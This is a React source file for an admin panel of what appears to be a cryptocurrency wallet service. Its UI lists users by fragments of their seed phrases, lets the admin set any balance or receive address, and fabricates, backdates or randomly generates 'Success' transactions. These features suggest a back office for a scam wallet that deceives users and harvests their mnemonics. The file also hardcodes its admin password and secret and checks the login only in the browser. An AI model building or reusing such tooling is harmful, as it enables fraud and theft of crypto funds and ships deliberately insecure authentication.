// src/components/AdminPage.jsx
import { useEffect, useState } from 'react'
import axios from 'axios'
import DatePicker from 'react-datepicker'
import 'react-datepicker/dist/react-datepicker.css'

const ALL_TOKENS = ['ETH', 'USDT', 'BTC', 'SHIBA', 'APH']

export default function AdminPage() {
  const API = import.meta.env.VITE_API_URL
  const ADMIN_SECRET = 'admin123'

  // Авторизация
  const [authorized, setAuthorized] = useState(false)
  const [adminPassword, setAdminPassword] = useState('')

  // Основные стейты
  const [users, setUsers] = useState([])
  const [selectedUser, setSelectedUser] = useState(null)
  const [balances, setBalances] = useState({})
  const [balanceAddresses, setBalanceAddresses] = useState({})
  const [transactions, setTransactions] = useState([])
  const [newTx, setNewTx] = useState({
    token: '',
    amount: '',
    to_address: '',
    status: '',
    date: ''
  })
  const [loading, setLoading] = useState(false)

  // Загрузить всех юзеров
  useEffect(() => {
    axios
      .get(`${API}/api/users`)
      .then(res => setUsers(res.data))
      .catch(console.error)
  }, [])

  // Вход
  const handleLogin = () => {
    if (adminPassword === '20482708') setAuthorized(true)
    else alert('Неверный пароль!')
  }

  // Загрузить данные по юзеру
  const loadUserData = async user => {
    setSelectedUser(user)
    setLoading(true)
    try {
      const [balRes, txRes] = await Promise.all([
        axios.get(`${API}/api/balances/${user.id}`),
        axios.get(`${API}/api/transactions/${user.id}`)
      ])
      const balMap = {},
        addrMap = {}
      balRes.data.forEach(b => {
        const t = b.token.toUpperCase()
        balMap[t] = b.amount
        addrMap[t] = b.receive_address || ''
      })
      setBalances(balMap)
      setBalanceAddresses(addrMap)
      setTransactions(txRes.data)
    } catch (err) {
      console.error(err)
    }
    setLoading(false)
  }

  // Эндпоинты
  const postAdmin = (url, body) =>
    axios.post(`${API}${url}`, { ...body, secret: ADMIN_SECRET })

  const updateBalance = (token, amount) =>
    postAdmin('/api/admin/update-balance', {
      user_id: selectedUser.id,
      token,
      amount: parseFloat(amount)
    })
      .then(() => loadUserData(selectedUser))
      .catch(err => alert(err.message))

  const updateBalanceAddress = (token, addr) =>
    postAdmin('/api/admin/update-balance-address', {
      user_id: selectedUser.id,
      token,
      receive_address: addr
    })
      .then(() => loadUserData(selectedUser))
      .catch(err => alert(err.message))

  const updateTransaction = tx => {
    const date = new Date(tx.date).toISOString()
    postAdmin('/api/admin/update-transaction', { ...tx, date })
      .then(() => loadUserData(selectedUser))
      .catch(err => alert(err.message))
  }

  const deleteTransaction = id =>
    postAdmin('/api/admin/delete-transaction', { id })
      .then(() => loadUserData(selectedUser))
      .catch(err => alert(err.message))

  const createTransaction = tx =>
    postAdmin('/api/admin/create-transaction', {
      ...tx,
      date: new Date(tx.date).toISOString(),
      user_id: selectedUser.id
    })
      .then(() => loadUserData(selectedUser))
      .catch(err => alert(err.message))

  // «Рандомная» транзакция
  const generateRandomTx = () => {
    if (!selectedUser) return alert('Сначала выберите пользователя')
    const token = ALL_TOKENS[Math.floor(Math.random() * ALL_TOKENS.length)]
    const amount = (Math.random() * 99 + 1).toFixed(4)
    const to_address = balanceAddresses[token] || ''
    const status = 'Success'
    const date = new Date().toISOString()
    createTransaction({ token, amount, to_address, status, date })
  }

  return (
    <div style={{ padding: 24, background: '#111', color: '#fff' }}>
      {!authorized ? (
        <div>
          <h2>Admin Login</h2>
          <input
            type="password"
            placeholder="Введите пароль"
            value={adminPassword}
            onChange={e => setAdminPassword(e.target.value)}
            style={{ marginRight: 8 }}
          />
          <button onClick={handleLogin}>Login</button>
        </div>
      ) : (
        <>
          <h2>👨‍💻 Admin Panel</h2>

          <h3>Users</h3>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginBottom: 16 }}>
            {users.map(u => (
              <button
                key={u.id}
                onClick={() => loadUserData(u)}
                style={{
                  padding: 8,
                  background: selectedUser?.id === u.id ? '#0ff' : '#333'
                }}
              >
                {u.mnemonic.split(' ').slice(0, 3).join(' ')}…
              </button>
            ))}
          </div>

          {loading && <p>Loading...</p>}

          {selectedUser && (
            <>
              <h3>Balances & Addresses for #{selectedUser.id}</h3>
              {ALL_TOKENS.map(token => (
                <div
                  key={token}
                  style={{
                    background: '#222',
                    padding: 12,
                    borderRadius: 6,
                    marginBottom: 8
                  }}
                >
                  <div>
                    <strong>{token}:</strong>{' '}
                    <input
                      type="number"
                      value={balances[token] ?? ''}
                      onChange={e =>
                        setBalances(b => ({ ...b, [token]: e.target.value }))
                      }
                    />
                    <button onClick={() => updateBalance(token, balances[token])}>
                      Save
                    </button>
                  </div>
                  <div style={{ marginTop: 6 }}>
                    <strong>Address:</strong>{' '}
                    <input
                      type="text"
                      value={balanceAddresses[token] ?? ''}
                      onChange={e =>
                        setBalanceAddresses(a => ({
                          ...a,
                          [token]: e.target.value
                        }))
                      }
                      style={{ width: 300 }}
                    />
                    <button
                      onClick={() =>
                        updateBalanceAddress(token, balanceAddresses[token])
                      }
                    >
                      Save Addr
                    </button>
                  </div>
                </div>
              ))}

              <h3>Create Transaction</h3>
              <div style={{ background: '#222', padding: 12, borderRadius: 6 }}>
                <button onClick={generateRandomTx} style={{ marginBottom: 12 }}>
                  🚀 Generate Random Tx
                </button>
                <div style={{ display: 'flex', gap: 8 }}>
                  <input
                    placeholder="Token"
                    value={newTx.token}
                    onChange={e => setNewTx(tx => ({ ...tx, token: e.target.value }))}
                  />
                  <input
                    placeholder="Amount"
                    type="number"
                    value={newTx.amount}
                    onChange={e => setNewTx(tx => ({ ...tx, amount: e.target.value }))}
                  />
                  <input
                    placeholder="To Address"
                    value={newTx.to_address}
                    onChange={e =>
                      setNewTx(tx => ({ ...tx, to_address: e.target.value }))
                    }
                  />
                  <input
                    placeholder="Status"
                    value={newTx.status}
                    onChange={e => setNewTx(tx => ({ ...tx, status: e.target.value }))}
                  />
                  <DatePicker
                    selected={newTx.date ? new Date(newTx.date) : null}
                    onChange={d => setNewTx(tx => ({ ...tx, date: d }))}
                    showTimeSelect
                    dateFormat="yyyy-MM-dd HH:mm"
                  />
                  <button onClick={() => createTransaction(newTx)}>➕ Create</button>
                </div>
              </div>

              <h3>Transaction History</h3>
              {transactions.map(tx => (
                <div
                  key={tx.id}
                  style={{
                    background: '#222',
                    padding: 12,
                    borderRadius: 6,
                    marginBottom: 8,
                    display: 'flex',
                    gap: 8,
                    alignItems: 'center'
                  }}
                >
                  <input
                    value={tx.token}
                    onChange={e => {
                      tx.token = e.target.value
                      setTransactions(ts => [...ts])
                    }}
                  />
                  <input
                    type="number"
                    value={tx.amount}
                    onChange={e => {
                      tx.amount = e.target.value
                      setTransactions(ts => [...ts])
                    }}
                  />
                  <input
                    value={tx.to_address}
                    onChange={e => {
                      tx.to_address = e.target.value
                      setTransactions(ts => [...ts])
                    }}
                  />
                  <input
                    value={tx.status}
                    onChange={e => {
                      tx.status = e.target.value
                      setTransactions(ts => [...ts])
                    }}
                  />
                  <DatePicker
                    selected={new Date(tx.date)}
                    onChange={d => {
                      tx.date = d
                      setTransactions(ts => [...ts])
                    }}
                    showTimeSelect
                    dateFormat="yyyy-MM-dd HH:mm"
                  />
                  <button onClick={() => updateTransaction(tx)}>💾 Save</button>
                  <button onClick={() => deleteTransaction(tx.id)}>🗑 Delete</button>
                </div>
              ))}
            </>
          )}
        </>
      )}
    </div>
  )
}
